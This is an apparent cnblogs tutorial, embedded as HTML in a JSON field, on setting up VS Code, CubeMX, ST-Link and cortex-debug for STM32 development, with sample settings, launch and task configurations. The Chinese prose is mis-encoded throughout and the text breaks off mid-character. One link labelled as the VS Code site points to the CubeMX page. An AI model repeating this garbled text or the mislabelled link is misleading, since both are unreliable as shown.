      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/chenyouyuan/p/19626759\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäºŽ 2026-02-20 19:31\">\n    <span>æ‰‹æŠŠæ‰‹æ•™ä½ ä½¿ç”¨vscodeå¼€å‘stm32ï¼</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        å·²ç»2026å¹´äº†ï¼Œä½ æ˜¯å¦è¿˜åœ¨ä½¿ç”¨å¤è€çš„keil5çš„è°ƒè¯•å‘¢ï¼Ÿæ˜¯å¦è¿˜åœ¨ä¸ºkeil5å¤åˆ¶ç²˜è´´ä»£ç åˆ°èŠå¤©å¼aiå†ç²˜è´´å›žæ¥è€Œçƒ¦æ¼å‘¢ï¼Ÿå¿«å¿«åŠ å…¥vscodeå¼€å‘stm32çš„å¤§éƒ¨é˜ŸæŽ¥å—å…‰è£çš„è¿›åŒ–å§ï¼\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"å¼€å‘å·¥å…·é…ç½®ç¯‡è¿ŽæŽ¥æ–°æ—¶ä»£--ä½¿ç”¨vscodeå¼€å‘stm32\">å¼€å‘å·¥å…·é…ç½®ç¯‡ï¼šè¿ŽæŽ¥æ–°æ—¶ä»£--ä½¿ç”¨vscodeå¼€å‘stm32</h1>\n<blockquote>\n<p>å·²ç»2026å¹´äº†ï¼Œä½ æ˜¯å¦è¿˜åœ¨ä½¿ç”¨å¤è€çš„keil5çš„è°ƒè¯•å‘¢ï¼Ÿæ˜¯å¦è¿˜åœ¨ä¸ºkeil5å¤åˆ¶ç²˜è´´ä»£ç åˆ°èŠå¤©å¼aiå†ç²˜è´´å›žæ¥è€Œçƒ¦æ¼å‘¢ï¼Ÿå¿«å¿«åŠ å…¥vscodeå¼€å‘stm32çš„å¤§éƒ¨é˜ŸæŽ¥å—å…‰è£çš„è¿›åŒ–å§ï¼</p>\n</blockquote>\n<p></p><div class=\"toc\"><div class=\"toc-container-header\">ç›®å½•</div><ul><li><a href=\"#å¼€å‘å·¥å…·é…ç½®ç¯‡è¿ŽæŽ¥æ–°æ—¶ä»£--ä½¿ç”¨vscodeå¼€å‘stm32\" rel=\"noopener nofollow\">å¼€å‘å·¥å…·é…ç½®ç¯‡ï¼šè¿ŽæŽ¥æ–°æ—¶ä»£--ä½¿ç”¨vscodeå¼€å‘stm32</a><ul><li><a href=\"#å‰è¨€\" rel=\"noopener nofollow\">å‰è¨€</a></li><li><a href=\"#æ‰€æœ‰ä¾èµ–çš„è½¯ä»¶ç™¾åº¦ç½‘ç›˜é“¾æŽ¥ä»¥åŠé…å¥—bç«™æ‰‹æŠŠæ‰‹è®²è§£è§†é¢‘\" rel=\"noopener nofollow\">æ‰€æœ‰ä¾èµ–çš„è½¯ä»¶ç™¾åº¦ç½‘ç›˜é“¾æŽ¥ä»¥åŠé…å¥—bç«™æ‰‹æŠŠæ‰‹è®²è§£è§†é¢‘</a></li><li><a href=\"#ä¸€ä¸‹è½½cubemxä»¥åŠå¯¹åº”stm32çš„halåº“\" rel=\"noopener nofollow\">ä¸€ã€ä¸‹è½½cubemxä»¥åŠå¯¹åº”stm32çš„halåº“</a></li><li><a href=\"#äºŒä¸‹è½½vscodeä»¥åŠæ’ä»¶\" rel=\"noopener nofollow\">äºŒã€ä¸‹è½½vscodeä»¥åŠæ’ä»¶</a><ul><li><a href=\"#stm32-for-vscode\" rel=\"noopener nofollow\">stm32 for vscode</a></li><li><a href=\"#makefiel\" rel=\"noopener nofollow\">makefiel</a></li></ul></li><li><a href=\"#ä¸‰stlinké©±åŠ¨å®‰è£\" rel=\"noopener nofollow\">ä¸‰ã€stlinké©±åŠ¨å®‰è£…</a></li><li><a href=\"#å››-é…ç½®å¼€å‘çŽ¯å¢ƒ\" rel=\"noopener nofollow\">å››ã€ é…ç½®å¼€å‘çŽ¯å¢ƒ</a><ul><li><a href=\"#é…ç½®çŽ¯å¢ƒå˜é‡\" rel=\"noopener nofollow\">é…ç½®çŽ¯å¢ƒå˜é‡</a></li><li><a href=\"#å…³äºŽlaunchjsonæ–‡ä»¶\" rel=\"noopener nofollow\">å…³äºŽlaunch.jsonæ–‡ä»¶</a></li><li><a href=\"#å…³äºŽtasksjsonæ–‡ä»¶\" rel=\"noopener nofollow\">å…³äºŽtasks.jsonæ–‡ä»¶</a></li></ul></li><li><a href=\"#å¼€å§‹è°ƒè¯•\" rel=\"noopener nofollow\">å¼€å§‹è°ƒè¯•</a><ul><li><a href=\"#stm32-svdæ–‡ä»¶\" rel=\"noopener nofollow\">stm32 svdæ–‡ä»¶</a></li></ul></li></ul></li></ul></div><p></p>\n<p>æœ¬ç¯‡æ–‡ç« ä¸»è¦å‚è€ƒæ¹–å—å¤§å­¦robomasterè·ƒé¹¿æˆ˜é˜Ÿçš„ç”µæŽ§å¼€æºéƒ¨åˆ†</p>\n<p><a href=\"https://gitee.com/hnuyuelurm/basic_framework/blob/master/.Doc/VSCode+Ozone%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95.md\" rel=\"noopener nofollow\" target=\"_blank\">.Doc/VSCode+Ozoneä½¿ç”¨æ–¹æ³•.md Â· HNUYueLuRM/basic_framework - Gitee.com</a></p>\n<h2 id=\"å‰è¨€\">å‰è¨€</h2>\n<p>æœ¬ç¯‡æ–‡ç« ä¸»è¦ä½¿ç”¨vscode + cubemxå¹³æ›¿keil5ï¼Œå®žçŽ°å¿«é€Ÿå¼€å‘ã€å®žæ—¶å¯è§†åŒ–å˜é‡ï¼ˆå…¨å±€ï¼‰ã€å¯ä»¥æŸ¥çœ‹å¯„å­˜å™¨å†…å®¹ã€copilotè¾…åŠ©å¼€å‘....</p>\n<p>æ”¯æŒstlinkï¼Œjlinkï¼Œdaplinkè°ƒè¯•å™¨ï¼Œæš‚æ—¶æ²¡æœ‰æ‰¾åˆ°çº¯é vscodeçš„å®žæ—¶å¯è§†åŒ–å‚æ•°æ³¢å½¢å›¾åŠŸèƒ½çš„æ’ä»¶</p>\n<p>å¦‚æžœå¤§å®¶è¿˜æœ‰å…¶ä»–å¥½ç”¨çš„æ–¹æ¡ˆæ¬¢è¿Žè®¨è®ºå™¢~</p>\n<h2 id=\"æ‰€æœ‰ä¾èµ–çš„è½¯ä»¶ç™¾åº¦ç½‘ç›˜é“¾æŽ¥ä»¥åŠé…å¥—bç«™æ‰‹æŠŠæ‰‹è®²è§£è§†é¢‘\">æ‰€æœ‰ä¾èµ–çš„è½¯ä»¶ç™¾åº¦ç½‘ç›˜é“¾æŽ¥ä»¥åŠé…å¥—bç«™æ‰‹æŠŠæ‰‹è®²è§£è§†é¢‘</h2>\n<p>å¯èƒ½ç½‘ç»œåŽŸå› å¯¼è‡´ä¸€äº›å®‰è£…æ— æ³•å®Œæˆï¼Œæ‰€ä»¥è¿™è¾¹æä¾›æ‰€ç”¨åˆ°çš„æ‰€æœ‰åŒ…ï¼Œæ ¹æ®éœ€è¦å®‰è£…å³å¯<br />\né€šè¿‡ç½‘ç›˜åˆ†äº«çš„æ–‡ä»¶ï¼šall_in_one.zip<br />\né“¾æŽ¥: <a href=\"https://pan.baidu.com/s/12brC2bPmu9wWa2h-VgIZmg?pwd=9xah\" rel=\"noopener nofollow\" target=\"_blank\">https://pan.baidu.com/s/12brC2bPmu9wWa2h-VgIZmg?pwd=9xah</a> æå–ç : 9xah<br />\n--æ¥è‡ªç™¾åº¦ç½‘ç›˜è¶…çº§ä¼šå‘˜v3çš„åˆ†äº«<br />\nbç«™è§†é¢‘é“¾æŽ¥<br />\n<a href=\"https://www.bilibili.com/video/BV1ZMfGBrEFy/?vd_source=f553a12b04c16a678ddc0064cc04563c\" rel=\"noopener nofollow\" target=\"_blank\">https://www.bilibili.com/video/BV1ZMfGBrEFy/?vd_source=f553a12b04c16a678ddc0064cc04563c</a></p>\n<h2 id=\"ä¸€ä¸‹è½½cubemxä»¥åŠå¯¹åº”stm32çš„halåº“\">ä¸€ã€ä¸‹è½½cubemxä»¥åŠå¯¹åº”stm32çš„halåº“</h2>\n<p>cubemxå®˜ç½‘(éœ€è¦ç®€å•çš„æ³¨å†Œå³å¯)ï¼š</p>\n<p><a href=\"https://www.st.com/en/development-tools/stm32cubemx.html#get-software\" rel=\"noopener nofollow\" target=\"_blank\">https://www.st.com/en/development-tools/stm32cubemx.html#get-software</a></p>\n<p>ä¸‹è½½å®Œæˆä¹‹åŽç‚¹å‡»</p>\n<p><img alt=\"\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220181610339.png\" /></p>\n<p>ç›´æŽ¥åœ¨æœç´¢æ æœç´¢ä½ ä½¿ç”¨çš„stm32çš„åž‹å·ï¼Œä»¥f103ä½œä¸ºä¾‹å­</p>\n<p><img alt=\"image-20260220181746320\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220181746320.png\" /></p>\n<p>åŒå‡»è¦é€‰æ‹©çš„æ¿å­å³å¯è¿›å…¥</p>\n<p>å…¶ä½™è¯¦ç»†çš„é…ç½®å¯ä»¥å‚è€ƒå…¶ä»–æ•™ç¨‹</p>\n<p>ä¸»è¦æ³¨æ„çš„æ˜¯ï¼š</p>\n<p>sysçš„é…ç½®è¦é…ç½®æˆswæ¨¡å¼ï¼Œä¸ç„¶ä¼šåªèƒ½çƒ§å½•ä¸€æ¬¡</p>\n<p><img alt=\"image-20260220181938762\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220181938762.png\" /></p>\n<p>å¯¼å‡ºè¿™è¾¹é€‰æ‹©makefile</p>\n<p><img alt=\"image-20260220182046638\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220182046638.png\" /></p>\n<h2 id=\"äºŒä¸‹è½½vscodeä»¥åŠæ’ä»¶\">äºŒã€ä¸‹è½½vscodeä»¥åŠæ’ä»¶</h2>\n<p>vscodeå®˜ç½‘ï¼š</p>\n<p><a href=\"https://www.st.com/en/development-tools/stm32cubemx.html#get-software\" rel=\"noopener nofollow\" target=\"_blank\">https://www.st.com/en/development-tools/stm32cubemx.html#get-software</a></p>\n<p>éœ€è¦å®‰è£…çš„vscdoeæ’ä»¶ï¼š</p>\n<p>ç‚¹å‡»vscodeå·¦ä¾§çš„è¿™ä¸ªå›¾æ ‡</p>\n<p><img alt=\"image-20260220174816604\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220174816604.png\" /></p>\n<h3 id=\"stm32-for-vscode\">stm32 for vscode</h3>\n<p><img alt=\"image-20260220160002646\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220160002646.png\" /></p>\n<p><img alt=\"image-20260220155925565\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220155925565.png\" /></p>\n<p>ç‚¹å‡»install build tools</p>\n<p><img alt=\"image-20260220175156853\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220175156853.png\" /></p>\n<p>å‡ºçŽ°å¦‚ä¸Šé¡µé¢å³ä»£è¡¨å®‰è£…æˆåŠŸï¼ˆå¤§çº¦5~15åˆ†é’Ÿï¼‰</p>\n<p>å¦‚æžœç½‘ç»œä¸å¥½å£è¯­åˆ‡æ¢æ‰‹æœºçƒ­ç‚¹å†æ¬¡å°è¯•</p>\n<p>è¿˜ä¸è¡Œå°±ç›´æŽ¥ä½¿ç”¨æˆ‘çš„ç™¾åº¦ç½‘ç›˜åˆ†äº«çš„zipåŽ‹ç¼©åŒ…ï¼Œå»ºè®®æ”¾åˆ°dç›˜ï¼ˆå¦‚æžœæœ‰çš„è¯ï¼‰</p>\n<h3 id=\"makefiel\">makefiel</h3>\n<p><img alt=\"image-20260220155854381\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220155854381.png\" /></p>\n<h2 id=\"ä¸‰stlinké©±åŠ¨å®‰è£…\">ä¸‰ã€stlinké©±åŠ¨å®‰è£…</h2>\n<p>å¦‚æžœä½ ä¹‹å‰æ²¡æœ‰ä½¿ç”¨è¿‡stlinkï¼Œè¯·æ ¹æ®å¦‚ä¸‹é“¾æŽ¥å®Œæˆstlinké©±åŠ¨çš„å®‰è£…</p>\n<p><a href=\"https://www.st.com.cn/zh/development-tools/stsw-link009.html\" rel=\"noopener nofollow\" target=\"_blank\">STSW-LINK009 | Software - æ„æ³•åŠå¯¼ä½“</a><br />\næ ¹æ®è‡ªå·±çš„ç”µè„‘é…ç½®åŒå‡»ä»¥ä¸‹ä¸¤ä¸ªexeä¸­çš„ä¸€ä¸ª</p>\n<p><img alt=\"image-20260220184946316\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220184946316.png\" /></p>\n<h2 id=\"å››-é…ç½®å¼€å‘çŽ¯å¢ƒ\">å››ã€ é…ç½®å¼€å‘çŽ¯å¢ƒ</h2>\n<h3 id=\"é…ç½®çŽ¯å¢ƒå˜é‡\">é…ç½®çŽ¯å¢ƒå˜é‡</h3>\n<ol>\n<li>\n<p>åœ¨vscodeæ‰¾åˆ°æœ€å·¦è¾¹çš„å››ä¸ªæ–¹å—å›¾æ ‡ï¼Œè¿™é‡Œæ˜¯æˆ‘ä»¬å®‰è£…æ‹“å±•çš„åœ°æ–¹</p>\n<p>ç‚¹å‡»ä¹‹åŽæ‰¾åˆ°stm32 for vscode</p>\n<p><img alt=\"image-20260220174706404\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220174706404.png\" /></p>\n</li>\n<li>\n<p>æ‰“å¼€è¯¦æƒ…é¡µé¢--&gt;ç‚¹å‡»å³ä¸‹è§’è“è‰²çš„ç¼“å­˜æ–‡å­—ï¼Œæ‰“å¼€ç¼“å­˜æ–‡ä»¶å¤¹</p>\n<p><img alt=\"image-20260220175025884\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220175025884.png\" /></p>\n<p>ç¼“å­˜æ–‡ä»¶å¤¹å¦‚ä¸‹</p>\n<p><img alt=\"image-20260220175310991\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220175310991.png\" /></p>\n</li>\n<li>\n<p>è¿›å…¥@å¼€å¤´çš„æ–‡ä»¶å¤¹,å¦‚ä¸‹ï¼Œæˆ‘ä»¬ä¸ºäº†æ–¹ä¾¿ï¼ŒæŠŠè¯¥æ–‡ä»¶å¤¹ä¸‹é¢æ‰€æœ‰çš„ä¸œè¥¿è¿ç§»åˆ°Dç›˜ï¼ˆå¦‚æžœæœ‰çš„è¯ï¼‰ï¼Œåœ¨Dç›˜ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹å«stm32toolsï¼ŒæŠŠæ–‡ä»¶å…¨éƒ¨æ”¾è¿›åŽ»</p>\n<p><img alt=\"image-20260220175354956\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220175354956.png\" /></p>\n<p>è¿ç§»è·¯å¾„å¦‚ä¸‹å›¾ï¼ˆå› ä¸ºè¿™ä¸ªæ¼”ç¤ºçš„æœºå™¨æ²¡æœ‰åˆ†dç›˜ï¼Œæˆ‘å°±æ”¾åˆ°cç›˜äº†ï¼‰</p>\n<p><img alt=\"image-20260220175533984\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220175533984.png\" /></p>\n</li>\n<li>\n<p>æŽ¥ä¸‹æ¥æŒ‰ä¸‹winé”®ï¼Œåœ¨æœç´¢æ æœç´¢çŽ¯å¢ƒ</p>\n<p>ç‚¹å‡»ç¼–è¾‘ç³»ç»ŸçŽ¯å¢ƒå˜é‡</p>\n<p><img alt=\"\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220174138545.png\" /></p>\n<p>ç‚¹å‡»æœ€ä¸‹é¢çš„çŽ¯å¢ƒå˜é‡ï¼ˆNï¼‰</p>\n<p><img alt=\"image-20260220174230783\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220174230783.png\" /></p>\n<p>åŒå‡»path</p>\n<p><img alt=\"image-20260220174323481\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220174323481.png\" /></p>\n<p>ç‚¹å‡»å³è¾¹çš„æ–°å»ºå³å¯æ–°å»ºå˜é‡ï¼Œctrl+vç²˜è´´ä¸‰ä¸ªbinçš„è·¯å¾„ï¼ˆå¦‚ä¸‹å›¾ï¼Œæ ¹æ®è‡ªå·±çš„æ–‡ä»¶ä½ç½®æ¥</p>\n<p><img alt=\"image-20260220174405199\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220174405199.png\" /></p>\n</li>\n</ol>\n<p>é…ç½®å®Œæˆä¹‹åŽwin + r</p>\n<p>åœ¨å¼¹å‡ºçš„çª—å£è¾“å…¥cmdï¼Œå›žè½¦</p>\n<p>ç²˜è´´å¦‚ä¸‹æŒ‡ä»¤è¿è¡Œ</p>\n<pre><code class=\"language-cmd\">arm-none-eabi-gcc -v\n</code></pre>\n<p>å¦‚æžœå‡ºçŽ°ç±»ä¼¼ä¸‹å›¾è¾“å‡ºï¼Œå°±ä»£è¡¨æˆåŠŸ</p>\n<p><img alt=\"image-20260220180204385\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220180204385.png\" /></p>\n<ol start=\"5\">\n<li>\n<p>æ‰“å¼€vscode è¿›å…¥åˆ°é¡¹ç›®æ–‡ä»¶å¤¹ï¼ˆå‰é¢åˆ›å»ºçš„cubemxé¡¹ç›®æ–‡ä»¶å¤¹ï¼‰</p>\n</li>\n<li>\n<p>ctrl + ï¼Œæ‰“å¼€è®¾ç½®ï¼Œæœç´¢stm32 for vscode<br />\n<img alt=\"image-20260220184204803\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220184204803.png\" /><br />\nç‚¹å‡»åœ¨settings.jsonä¸­ç¼–è¾‘,å®Œå–„å¦‚ä¸‹è·¯å¾„</p>\n<p><img alt=\"image-20260220184315477\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220184315477.png\" /><br />\nsettings.json(æ ¹æ®è‡ªå·±çš„è·¯å¾„é…ç½®)</p>\n<pre><code class=\"language-json\">{\n    \"stm32-for-vscode.openOCDPath\": \"C:\\\\stm32tools\\\\openocd\\\\0.12.0-7.1\\\\.content\\\\bin\\\\openocd.EXE\",\n    \"stm32-for-vscode.makePath\": \"C:\\\\stm32tools\\\\windows-build-tools\\\\4.4.1-3.1\\\\.content\\\\bin\\\\make.EXE\",\n    \"stm32-for-vscode.armToolchainPath\": \"C:\\\\stm32tools\\\\arm-none-eabi-gcc\\\\14.2.1-1.1.1\\\\.content\\\\bin\",\n    \"makefile.configureOnOpen\": true,\n    \"cortex-debug.stm32cubeprogrammer\": \"\",\n    \"cortex-debug.openocdPath\": \"C:\\\\stm32tools\\\\openocd\\\\0.12.0-7.1\\\\.content\\\\bin\\\\openocd.EXE\",\n    \"cortex-debug.armToolchainPath\": \"C:\\\\stm32tools\\\\arm-none-eabi-gcc\\\\14.2.1-1.1.1\\\\.content\\\\bin\",\n}\n</code></pre>\n</li>\n<li>\n<p>ctrl + ~</p>\n<p>åœ¨ç»ˆç«¯è¾“å…¥make -j12 æµ‹è¯•çœ‹çœ‹èƒ½å¦æˆåŠŸç¼–è¯‘,å¦‚ä¸‹å›¾å³ä»£è¡¨æˆåŠŸç¼–è¯‘</p>\n<p><img alt=\"image-20260220182335492\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220182335492.png\" /></p>\n</li>\n</ol>\n<h3 id=\"å…³äºŽlaunchjsonæ–‡ä»¶\">å…³äºŽlaunch.jsonæ–‡ä»¶</h3>\n<p>åœ¨å·¦è¾¹æ æ‰¾åˆ°è¿™ä¸ªå›¾æ ‡</p>\n<p><img alt=\"\" /></p>\n<p>ç‚¹å‡»ä¸€ä¸‹é‡Œé¢çš„åˆ›å»ºlaunchæ–‡ä»¶</p>\n<p>å°±å¯ä»¥åœ¨ç›®å½•çš„.vscodeæ–‡ä»¶å¤¹ä¸‹æ‰¾åˆ°</p>\n<p><img alt=\"image-20260220160146084\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220160146084.png\" /></p>\n<p>æˆ‘ä»¬ç›´æŽ¥å¤åˆ¶ä¸‹é¢æˆ‘ä¿®æ”¹å¥½çš„stlinkçš„ä»£ç ï¼ˆdaplinkã€jlinkæ¹–å¤§å¼€æºçš„giteeä»“åº“å·²ç»æä¾›ï¼‰</p>\n<pre><code class=\"language-json\">{\n    // å¯åŠ¨è°ƒè¯•çš„å¿«æ·é”®æ˜¯F5\n    \"version\": \"0.2.0\",\n    \"configurations\": [\n        // ä½¿ç”¨dap-link(å¦‚æ— çº¿è°ƒè¯•å™¨æ—¶çš„å‚è€ƒé…ç½®)\n        {\n            \"name\": \"STlink\",\n            \"cwd\": \"${workspaceRoot}\",\n            \"executable\": \"${workspaceRoot}\\\\build\\\\first.elf\", // è¦ä¸‹è½½åˆ°è°ƒè¯•å™¨çš„æ–‡ä»¶,èŠ±æ‹¬å·ä¸­çš„æ˜¯vscodeä¸¤ä¸ªé¢„å®šä¹‰çš„å‚æ•°\n            \"request\": \"launch\",\n            \"type\": \"cortex-debug\",\n            //ä½¿ç”¨J-link GDB Serveræ—¶å¿…é¡»;å…¶ä»–GBD Serveræ—¶å¯é€‰ï¼ˆæœ‰å¯èƒ½å¸®åŠ©è‡ªåŠ¨é€‰æ‹©SVDæ–‡ä»¶ï¼‰\n            //æ”¯æŒçš„è®¾å¤‡è§ https://www.segger.com/downloads/supported-devices.php\n            //svdæ–‡ä»¶ï¼Œæœ‰è¿™ä¸ªæ–‡ä»¶æ‰èƒ½æŸ¥çœ‹å¯„å­˜å™¨çš„å€¼ï¼Œæ¯ä¸ªå•ç‰‡æœºéƒ½ä¸åŒã€‚å¯ä»¥åœ¨ä»¥ä¸‹åœ°å€æ‰¾åˆ°https://github.com/modm-io/cmsis-svd-stm32 \n            //è¯¥é¡¹ç›®çš„æ ¹ç›®å½•å·²ç»æä¾›äº†Cåž‹å¼€å‘æ¿ä½¿ç”¨çš„å¤–è®¾svdæ–‡ä»¶\n            \"svdFile\": \"./STM32F103.svd\",\n            \"servertype\": \"openocd\", //ä½¿ç”¨çš„GDB Server\n            \"configFiles\": [\n                \"openocd_stlink.cfg\", // é…ç½®æ–‡ä»¶å·²ç»åœ¨æ ¹ç›®å½•æä¾›,è‹¥è¦ä¿®æ”¹ä»¥æ­¤ç±»æŽ¨,openocdçš„è·¯å¾„ä¸‹çš„share/scriptsä¸­æœ‰å„ç§å†™å¥½çš„é…ç½®æ–‡ä»¶\n            ],\n            \"runToEntryPoint\": \"main\", // è°ƒè¯•æ—¶åœ¨mainå‡½æ•°å…¥å£åœä¸‹\n            \"preLaunchTask\": \"build task\",//å…ˆè¿è¡ŒBuildä»»åŠ¡ç¼–è¯‘é¡¹ç›®,å–æ¶ˆæ³¨é‡Šå³å¯ä½¿ç”¨\n            \"liveWatch\": {\n                \"enabled\": true,\n                \"samplesPerSecond\": 4\n            }\n        },\n      \n    ],\n}\n</code></pre>\n<p>é…ç½®å®Œæˆä¹‹åŽåœ¨vscodeçš„å·¦ä¾§debugå›¾æ ‡å³å¯çœ‹åˆ°æ›´æ”¹é…ç½®çš„stlinkçš„é…ç½®<br />\n<img alt=\"image-20260220184555431\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220184555431.png\" /></p>\n<h3 id=\"å…³äºŽtasksjsonæ–‡ä»¶\">å…³äºŽtasks.jsonæ–‡ä»¶</h3>\n<p>ä½ç½®ä¸Žlaunchæ–‡ä»¶ä¸€æ ·ï¼Œæ²¡æœ‰å°±æ–°å»ºä¸€ä¸ª</p>\n<pre><code class=\"language-json\">{\n    // See https://go.microsoft.com/fwlink/?LinkId=733558\n    \"version\": \"2.0.0\",\n    \"tasks\": [\n        {\n            \"label\": \"build task\",         // ä»»åŠ¡æ ‡ç­¾\n            \"type\": \"shell\",               // ä»»åŠ¡ç±»åž‹,å› ä¸ºè¦è°ƒç”¨mingw32-make,æ˜¯åœ¨ç»ˆç«¯(CMD)é‡Œè¿è¡Œçš„,æ‰€ä»¥æ˜¯shellä»»åŠ¡\n            \"command\": \"make -j24\",// ä»»åŠ¡å‘½ä»¤,çº¿ç¨‹æ•°å¯ä»¥æ ¹æ®è‡ªå·±çš„ç”µè„‘ä¿®æ”¹,å»ºè®®ä¸Žcpuæ ¸æ•°ç›¸åŒ\n            \"problemMatcher\": [],          \n            \"group\": {\n                \"kind\": \"build\",\n                \"isDefault\": true\n            }\n        },\n        {\n            \"label\": \"download dap\",\n            \"type\": \"shell\",               // å¦‚æžœå¸Œæœ›åœ¨ä¸‹è½½å‰ç¼–è¯‘,å¯ä»¥æŠŠcommandæ¢æˆä¸‹é¢çš„å‘½ä»¤\n            \"command\":\"make -j24 ; make download_dap\", // \"mingw32-make -j24 ; mingw32-make download_dap\",\n            \"group\": {                     // å¦‚æžœæ²¡æœ‰ä¿®æ”¹ä»£ç ,ç¼–è¯‘ä»»åŠ¡ä¸ä¼šæ¶ˆè€—æ—¶é—´,å› æ­¤æŽ¨èä½¿ç”¨ä¸Šé¢çš„æ›¿æ¢.\n                \"kind\": \"build\",\n                \"isDefault\": false,\n            },\n        },\n        {\n            \"label\": \"download jlink\", // è¦ä½¿ç”¨æ­¤ä»»åŠ¡,éœ€æ·»åŠ jlinkçš„çŽ¯å¢ƒå˜é‡\n            \"type\": \"shell\",\n            \"command\":\"make -j24 ; make download_jlink\", // \"mingw32-make -j24 ; mingw32-make download_jlink\"\n            \"group\": {\n                \"kind\": \"build\",\n                \"isDefault\": false,\n            }\n        },\n        {\n            \"label\": \"log\",\n            \"type\": \"shell\",\n            \"command\":\"JlinkRTTClient\",\n            \"args\": [],\n            \"problemMatcher\": [],\n            // \"dependsOn\":[\n            //     \"build task\", // å¯ä»¥æ·»åŠ å¤šä¸ª.\n            // ]\n            // è‹¥ä½¿ç”¨daplink,åˆ™å°†logä»»åŠ¡è®¾ç½®ä¸ºä¾èµ–äºŽjlink launchä»»åŠ¡,ä¿è¯jlink launchä»»åŠ¡å…ˆäºŽlogä»»åŠ¡æ‰§è¡Œ\n        }\n    ]\n}\n</code></pre>\n<h2 id=\"å¼€å§‹è°ƒè¯•\">å¼€å§‹è°ƒè¯•</h2>\n<p>åˆ°æ­¤é…ç½®åº”å½“å·²ç»å®Œæˆäº†ï¼ŒæŽ¥å¥½stlinkï¼Œè¿žæŽ¥å¥½stm32åŽå°±å¯ä»¥æ„‰å¿«çš„è°ƒè¯•å•¦ï¼Œç‚¹å‡»ç»¿è‰²çš„ä¸‰è§’å½¢å¼€å§‹ç¼–è¯‘å¹¶çƒ§å½•åˆ°å•ç‰‡æœº<br />\n<img alt=\"image-20260220184555431\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220184555431.png\" /></p>\n<p>ç­‰å¾…ä¸€ä¼šåŽï¼Œå°±ä¼šå‡ºçŽ°ä¸‹å›¾æ‰€ç¤ºçš„è°ƒè¯•ç•Œé¢<br />\n<img alt=\"image-20260220185452486\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220185452486.png\" /><br />\nåœ¨å·¦ä¾§å°±æ˜¯è°ƒè¯•å¸¸ç”¨çš„ä¸€äº›å·¥å…·<br />\n<img alt=\"image-20260220185552784\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220185552784.png\" /></p>\n<p>cortex live watchå¯ä»¥å®žæ—¶æŸ¥çœ‹å…¨å±€å˜é‡çš„å€¼ï¼Œåªéœ€è¦ç‚¹å‡»åŠ å·<br />\n<img alt=\"image-20260220185701085\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220185701085.png\" /></p>\n<p>ç²˜è´´éœ€è¦æŸ¥çœ‹çš„å˜é‡åç§°</p>\n<p><img alt=\"image-20260220185726335\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220185726335.png\" /></p>\n<p>å°±å¯ä»¥å®žæ—¶æŸ¥çœ‹åˆ°å˜é‡çš„å€¼å•¦</p>\n<p><img alt=\"image-20260220185758953\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220185758953.png\" /></p>\n<p>ä»Žå·¦åˆ°å³ ç¬¬ä¸€ä¸ªæ˜¯é‡ç½®resetï¼Œæš‚åœï¼Œé€è¿‡ç¨‹ï¼Œå•æ­¥ï¼Œå•æ­¥è·³å‡ºï¼Œé‡æ–°å¼€å§‹è°ƒè¯•ï¼Œé€€å‡º</p>\n<p><img alt=\"image-20260220185836594\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220185836594.png\" /></p>\n<p>XPERIPHERALSå¿…é¡»é…ç½®ä¸Šé¢çš„svdæ–‡ä»¶æ‰èƒ½å¤Ÿçœ‹åˆ°å¯„å­˜å™¨å†…éƒ¨çš„å€¼</p>\n<p><img alt=\"image-20260220190044929\" src=\"http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220190044929.png\" /></p>\n<p>ä½ 